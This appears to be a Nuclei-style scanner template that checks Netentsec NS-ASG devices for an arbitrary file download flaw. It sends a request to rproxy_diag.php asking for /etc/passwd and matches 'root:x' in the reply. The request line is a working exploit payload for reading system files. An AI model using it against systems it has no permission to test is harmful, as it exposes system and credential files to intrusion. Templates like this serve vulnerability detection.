id: NS-ASG-fileRead
info:
  author: Str1am
  name: "\u7F51\u5EB7 NS-ASG \u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E"
  severity: high
  tags: ASG,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/debug/rproxy_diag.php?action=download&filename=/etc/passwd'
